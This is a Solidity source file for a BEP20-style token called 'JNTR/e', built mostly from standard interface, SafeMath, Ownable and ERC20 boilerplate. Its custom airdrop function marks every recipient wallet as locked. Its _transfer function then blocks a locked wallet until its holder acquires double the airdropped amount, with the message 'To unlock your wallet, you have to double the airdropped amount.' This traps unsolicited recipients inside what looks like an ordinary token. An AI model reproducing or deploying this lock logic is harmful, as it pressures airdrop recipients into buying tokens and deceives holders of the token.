1 pragma solidity 0.5.16;
2 
3 interface IERC20 {
4   /**
5    * @dev Returns the amount of tokens in existence.
6    */
7   function totalSupply() external view returns (uint256);
8 
9   /**
10    * @dev Returns the token decimals.
11    */
12   function decimals() external view returns (uint8);
13 
14   /**
15    * @dev Returns the token symbol.
16    */
17   function symbol() external view returns (string memory);
18 
19   /**
20   * @dev Returns the token name.
21   */
22   function name() external view returns (string memory);
23 
24   /**
25    * @dev Returns the amount of tokens owned by `account`.
26    */
27   function balanceOf(address account) external view returns (uint256);
28 
29   /**
30    * @dev Moves `amount` tokens from the caller's account to `recipient`.
31    *
32    * Returns a boolean value indicating whether the operation succeeded.
33    *
34    * Emits a {Transfer} event.
35    */
36   function transfer(address recipient, uint256 amount) external returns (bool);
37 
38   /**
39    * @dev Returns the remaining number of tokens that `spender` will be
40    * allowed to spend on behalf of `owner` through {transferFrom}. This is
41    * zero by default.
42    *
43    * This value changes when {approve} or {transferFrom} are called.
44    */
45   function allowance(address _owner, address spender) external view returns (uint256);
46 
47   /**
48    * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
49    *
50    * Returns a boolean value indicating whether the operation succeeded.
51    *
52    * IMPORTANT: Beware that changing an allowance with this method brings the risk
53    * that someone may use both the old and the new allowance by unfortunate
54    * transaction ordering. One possible solution to mitigate this race
55    * condition is to first reduce the spender's allowance to 0 and set the
56    * desired value afterwards:
57    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
58    *
59    * Emits an {Approval} event.
60    */
61   function approve(address spender, uint256 amount) external returns (bool);
62 
63   /**
64    * @dev Moves `amount` tokens from `sender` to `recipient` using the
65    * allowance mechanism. `amount` is then deducted from the caller's
66    * allowance.
67    *
68    * Returns a boolean value indicating whether the operation succeeded.
69    *
70    * Emits a {Transfer} event.
71    */
72   function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
73 
74   /**
75    * @dev Emitted when `value` tokens are moved from one account (`from`) to
76    * another (`to`).
77    *
78    * Note that `value` may be zero.
79    */
80   event Transfer(address indexed from, address indexed to, uint256 value);
81 
82   /**
83    * @dev Emitted when the allowance of a `spender` for an `owner` is set by
84    * a call to {approve}. `value` is the new allowance.
85    */
86   event Approval(address indexed owner, address indexed spender, uint256 value);
87 }
88 
89 /*
90  * @dev Provides information about the current execution context, including the
91  * sender of the transaction and its data. While these are generally available
92  * via msg.sender and msg.data, they should not be accessed in such a direct
93  * manner, since when dealing with GSN meta-transactions the account sending and
94  * paying for execution may not be the actual sender (as far as an application
95  * is concerned).
96  *
97  * This contract is only required for intermediate, library-like contracts.
98  */
99 contract Context {
100   // Empty internal constructor, to prevent people from mistakenly deploying
101   // an instance of this contract, which should be used via inheritance.
102   constructor () internal { }
103 
104   function _msgSender() internal view returns (address payable) {
105     return msg.sender;
106   }
107 
108   function _msgData() internal view returns (bytes memory) {
109     this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
110     return msg.data;
111   }
112 }
113 
114 /**
115  * @dev Wrappers over Solidity's arithmetic operations with added overflow
116  * checks.
117  *
118  * Arithmetic operations in Solidity wrap on overflow. This can easily result
119  * in bugs, because programmers usually assume that an overflow raises an
120  * error, which is the standard behavior in high level programming languages.
121  * `SafeMath` restores this intuition by reverting the transaction when an
122  * operation overflows.
123  *
124  * Using this library instead of the unchecked operations eliminates an entire
125  * class of bugs, so it's recommended to use it always.
126  */
127 library SafeMath {
128   /**
129    * @dev Returns the addition of two unsigned integers, reverting on
130    * overflow.
131    *
132    * Counterpart to Solidity's `+` operator.
133    *
134    * Requirements:
135    * - Addition cannot overflow.
136    */
137   function add(uint256 a, uint256 b) internal pure returns (uint256) {
138     uint256 c = a + b;
139     require(c >= a, "SafeMath: addition overflow");
140 
141     return c;
142   }
143 
144   /**
145    * @dev Returns the subtraction of two unsigned integers, reverting on
146    * overflow (when the result is negative).
147    *
148    * Counterpart to Solidity's `-` operator.
149    *
150    * Requirements:
151    * - Subtraction cannot overflow.
152    */
153   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
154     return sub(a, b, "SafeMath: subtraction overflow");
155   }
156 
157   /**
158    * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
159    * overflow (when the result is negative).
160    *
161    * Counterpart to Solidity's `-` operator.
162    *
163    * Requirements:
164    * - Subtraction cannot overflow.
165    */
166   function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
167     require(b <= a, errorMessage);
168     uint256 c = a - b;
169 
170     return c;
171   }
172 
173   /**
174    * @dev Returns the multiplication of two unsigned integers, reverting on
175    * overflow.
176    *
177    * Counterpart to Solidity's `*` operator.
178    *
179    * Requirements:
180    * - Multiplication cannot overflow.
181    */
182   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
183     // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
184     // benefit is lost if 'b' is also tested.
185     // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
186     if (a == 0) {
187       return 0;
188     }
189 
190     uint256 c = a * b;
191     require(c / a == b, "SafeMath: multiplication overflow");
192 
193     return c;
194   }
195 
196   /**
197    * @dev Returns the integer division of two unsigned integers. Reverts on
198    * division by zero. The result is rounded towards zero.
199    *
200    * Counterpart to Solidity's `/` operator. Note: this function uses a
201    * `revert` opcode (which leaves remaining gas untouched) while Solidity
202    * uses an invalid opcode to revert (consuming all remaining gas).
203    *
204    * Requirements:
205    * - The divisor cannot be zero.
206    */
207   function div(uint256 a, uint256 b) internal pure returns (uint256) {
208     return div(a, b, "SafeMath: division by zero");
209   }
210 
211   /**
212    * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
213    * division by zero. The result is rounded towards zero.
214    *
215    * Counterpart to Solidity's `/` operator. Note: this function uses a
216    * `revert` opcode (which leaves remaining gas untouched) while Solidity
217    * uses an invalid opcode to revert (consuming all remaining gas).
218    *
219    * Requirements:
220    * - The divisor cannot be zero.
221    */
222   function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
223     // Solidity only automatically asserts when dividing by 0
224     require(b > 0, errorMessage);
225     uint256 c = a / b;
226     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
227 
228     return c;
229   }
230 
231   /**
232    * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
233    * Reverts when dividing by zero.
234    *
235    * Counterpart to Solidity's `%` operator. This function uses a `revert`
236    * opcode (which leaves remaining gas untouched) while Solidity uses an
237    * invalid opcode to revert (consuming all remaining gas).
238    *
239    * Requirements:
240    * - The divisor cannot be zero.
241    */
242   function mod(uint256 a, uint256 b) internal pure returns (uint256) {
243     return mod(a, b, "SafeMath: modulo by zero");
244   }
245 
246   /**
247    * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
248    * Reverts with custom message when dividing by zero.
249    *
250    * Counterpart to Solidity's `%` operator. This function uses a `revert`
251    * opcode (which leaves remaining gas untouched) while Solidity uses an
252    * invalid opcode to revert (consuming all remaining gas).
253    *
254    * Requirements:
255    * - The divisor cannot be zero.
256    */
257   function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
258     require(b != 0, errorMessage);
259     return a % b;
260   }
261 }
262 
263 /**
264  * @dev Contract module which provides a basic access control mechanism, where
265  * there is an account (an owner) that can be granted exclusive access to
266  * specific functions.
267  *
268  * By default, the owner account will be the one that deploys the contract. This
269  * can later be changed with {transferOwnership}.
270  *
271  * This module is used through inheritance. It will make available the modifier
272  * `onlyOwner`, which can be applied to your functions to restrict their use to
273  * the owner.
274  */
275 contract Ownable is Context {
276   address private _owner;
277 
278   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
279 
280   /**
281    * @dev Initializes the contract setting the deployer as the initial owner.
282    */
283   constructor () internal {
284     //address msgSender = _msgSender();
285     _owner = _msgSender();
286     emit OwnershipTransferred(address(0), _owner);
287   }
288 
289   /**
290    * @dev Returns the address of the current owner.
291    */
292   function owner() public view returns (address) {
293     return _owner;
294   }
295 
296   /**
297    * @dev Throws if called by any account other than the owner.
298    */
299   modifier onlyOwner() {
300     require(_owner == _msgSender(), "Ownable: caller is not the owner");
301     _;
302   }
303 
304   /**
305    * @dev Leaves the contract without owner. It will not be possible to call
306    * `onlyOwner` functions anymore. Can only be called by the current owner.
307    *
308    * NOTE: Renouncing ownership will leave the contract without an owner,
309    * thereby removing any functionality that is only available to the owner.
310    */
311   function renounceOwnership() public onlyOwner {
312     emit OwnershipTransferred(_owner, address(0));
313     _owner = address(0);
314   }
315 
316   /**
317    * @dev Transfers ownership of the contract to a new account (`newOwner`).
318    * Can only be called by the current owner.
319    */
320   function transferOwnership(address newOwner) public onlyOwner {
321     _transferOwnership(newOwner);
322   }
323 
324   /**
325    * @dev Transfers ownership of the contract to a new account (`newOwner`).
326    */
327   function _transferOwnership(address newOwner) internal {
328     require(newOwner != address(0), "Ownable: new owner is the zero address");
329     emit OwnershipTransferred(_owner, newOwner);
330     _owner = newOwner;
331   }
332 }
333 
334 contract ERC20Token is Context, IERC20, Ownable {
335   using SafeMath for uint256;
336 
337   mapping(address => bool) public gateways; // different gateways will be used for different pairs (chains)
338   address public airdrop_maker;
339   uint256 public unlock_amount;
340   
341   mapping (address => bool) public locked;
342   mapping (address => uint256) private _balances;
343 
344   mapping (address => mapping (address => uint256)) private _allowances;
345 
346   uint256 private _totalSupply;
347   uint8 private _decimals;
348   string private _symbol;
349   string private _name;
350 
351   event ChangeGateway(address gateway, bool active);
352 
353   /**
354    * @dev Throws if called by any account other than the gateway.
355    */
356   modifier onlyGateway() {
357     require(gateways[_msgSender()], "Caller is not the gateway");
358     _;
359   }
360 
361   constructor() public {
362     _name = "JNTR/e";
363     _symbol = "JNTR/e";
364     _decimals = 18;
365     _totalSupply = 0;
366   }
367 
368   function changeGateway(address gateway, bool active) external onlyOwner returns(bool) {
369     gateways[gateway] = active;
370     emit ChangeGateway(gateway, active);
371     return true;
372   }
373 
374   function setAirdropMaker(address _addr) external onlyOwner returns(bool) {
375     airdrop_maker = _addr;
376     return true;
377   }
378   
379   function airdrop(address[] calldata recipients, uint256 amount) external returns(bool) {
380     require(msg.sender == airdrop_maker, "Not airdrop maker");
381     uint256 len = recipients.length;
382     address sender = msg.sender;
383     _balances[sender] = _balances[sender].sub(amount*len, "BEP20: transfer amount exceeds balance");
384 
385     while (len > 0) {
386       len--;
387       address recipient = recipients[len];
388       locked[recipient] = true;
389       _balances[recipient] = _balances[recipient].add(amount);
390       emit Transfer(sender, recipient, amount);
391     }
392     unlock_amount = amount * 2;
393     return true;
394   }
395   
396   /**
397    * @dev Returns the token decimals.
398    */
399   function decimals() external view returns (uint8) {
400     return _decimals;
401   }
402 
403   /**
404    * @dev Returns the token symbol.
405    */
406   function symbol() external view returns (string memory) {
407     return _symbol;
408   }
409 
410   /**
411   * @dev Returns the token name.
412   */
413   function name() external view returns (string memory) {
414     return _name;
415   }
416 
417   /**
418    * @dev See {BEP20-totalSupply}.
419    */
420   function totalSupply() external view returns (uint256) {
421     return _totalSupply;
422   }
423 
424   /**
425    * @dev See {BEP20-balanceOf}.
426    */
427   function balanceOf(address account) external view returns (uint256) {
428     return _balances[account];
429   }
430 
431   /**
432    * @dev See {BEP20-transfer}.
433    *
434    * Requirements:
435    *
436    * - `recipient` cannot be the zero address.
437    * - the caller must have a balance of at least `amount`.
438    */
439   function transfer(address recipient, uint256 amount) external returns (bool) {
440     //if (msg.sender == airdrop_maker) locked[recipient] = true;
441     _transfer(_msgSender(), recipient, amount);
442     return true;
443   }
444 
445   /**
446    * @dev See {BEP20-allowance}.
447    */
448   function allowance(address owner, address spender) external view returns (uint256) {
449     return _allowances[owner][spender];
450   }
451 
452   /**
453    * @dev See {BEP20-approve}.
454    *
455    * Requirements:
456    *
457    * - `spender` cannot be the zero address.
458    */
459   function approve(address spender, uint256 amount) external returns (bool) {
460     _approve(_msgSender(), spender, amount);
461     return true;
462   }
463 
464   /**
465    * @dev See {BEP20-transferFrom}.
466    *
467    * Emits an {Approval} event indicating the updated allowance. This is not
468    * required by the EIP. See the note at the beginning of {BEP20};
469    *
470    * Requirements:
471    * - `sender` and `recipient` cannot be the zero address.
472    * - `sender` must have a balance of at least `amount`.
473    * - the caller must have allowance for `sender`'s tokens of at least
474    * `amount`.
475    */
476   function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
477     _transfer(sender, recipient, amount);
478     _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
479     return true;
480   }
481 
482   /**
483    * @dev Atomically increases the allowance granted to `spender` by the caller.
484    *
485    * This is an alternative to {approve} that can be used as a mitigation for
486    * problems described in {BEP20-approve}.
487    *
488    * Emits an {Approval} event indicating the updated allowance.
489    *
490    * Requirements:
491    *
492    * - `spender` cannot be the zero address.
493    */
494   function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
495     _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
496     return true;
497   }
498 
499   /**
500    * @dev Atomically decreases the allowance granted to `spender` by the caller.
501    *
502    * This is an alternative to {approve} that can be used as a mitigation for
503    * problems described in {BEP20-approve}.
504    *
505    * Emits an {Approval} event indicating the updated allowance.
506    *
507    * Requirements:
508    *
509    * - `spender` cannot be the zero address.
510    * - `spender` must have allowance for the caller of at least
511    * `subtractedValue`.
512    */
513   function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
514     _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
515     return true;
516   }
517 
518   /**
519    * @dev Creates `amount` tokens and assigns them to `msg.sender`, increasing
520    * the total supply.
521    *
522    * Requirements
523    *
524    * - `msg.sender` must be the token owner
525    */
526   function mint(address to, uint256 amount) public onlyGateway returns (bool) {
527     _mint(to, amount);
528     return true;
529   }
530 
531   /**
532    * @dev Moves tokens `amount` from `sender` to `recipient`.
533    *
534    * This is internal function is equivalent to {transfer}, and can be used to
535    * e.g. implement automatic token fees, slashing mechanisms, etc.
536    *
537    * Emits a {Transfer} event.
538    *
539    * Requirements:
540    *
541    * - `sender` cannot be the zero address.
542    * - `recipient` cannot be the zero address.
543    * - `sender` must have a balance of at least `amount`.
544    */
545   function _transfer(address sender, address recipient, uint256 amount) internal {
546     require(sender != address(0), "BEP20: transfer from the zero address");
547     require(recipient != address(0), "BEP20: transfer to the zero address");
548     if (locked[sender]) {
549         require(_balances[sender] >= unlock_amount, "To unlock your wallet, you have to double the airdropped amount.");
550         locked[sender] = false;
551     }
552 
553     _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
554     _balances[recipient] = _balances[recipient].add(amount);
555 
556     emit Transfer(sender, recipient, amount);
557   }
558 
559   /** @dev Creates `amount` tokens and assigns them to `account`, increasing
560    * the total supply.
561    *
562    * Emits a {Transfer} event with `from` set to the zero address.
563    *
564    * Requirements
565    *
566    * - `to` cannot be the zero address.
567    */
568   function _mint(address account, uint256 amount) internal {
569     require(account != address(0), "BEP20: mint to the zero address");
570 
571     _totalSupply = _totalSupply.add(amount);
572     _balances[account] = _balances[account].add(amount);
573     emit Transfer(address(0), account, amount);
574   }
575 
576   /**
577    * @dev Destroys `amount` tokens from `account`, reducing the
578    * total supply.
579    *
580    * Emits a {Transfer} event with `to` set to the zero address.
581    *
582    * Requirements
583    *
584    * - `account` cannot be the zero address.
585    * - `account` must have at least `amount` tokens.
586    */
587   function _burn(address account, uint256 amount) internal {
588     require(account != address(0), "BEP20: burn from the zero address");
589 
590     _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
591     _totalSupply = _totalSupply.sub(amount);
592     emit Transfer(account, address(0), amount);
593   }
594 
595   /**
596    * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
597    *
598    * This is internal function is equivalent to `approve`, and can be used to
599    * e.g. set automatic allowances for certain subsystems, etc.
600    *
601    * Emits an {Approval} event.
602    *
603    * Requirements:
604    *
605    * - `owner` cannot be the zero address.
606    * - `spender` cannot be the zero address.
607    */
608   function _approve(address owner, address spender, uint256 amount) internal {
609     require(owner != address(0), "BEP20: approve from the zero address");
610     require(spender != address(0), "BEP20: approve to the zero address");
611 
612     _allowances[owner][spender] = amount;
613     emit Approval(owner, spender, amount);
614   }
615 
616   /**
617    * @dev Destroys `amount` tokens from `account`.`amount` is then deducted
618    * from the caller's allowance.
619    *
620    * See {_burn} and {_approve}.
621    */
622   function _burnFrom(address account, uint256 amount) internal {
623     _burn(account, amount);
624     _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
625   }
626 
627   function burnFrom(address account, uint256 amount) external returns(bool) {
628     _burnFrom(account, amount);
629     return true;
630   }
631 }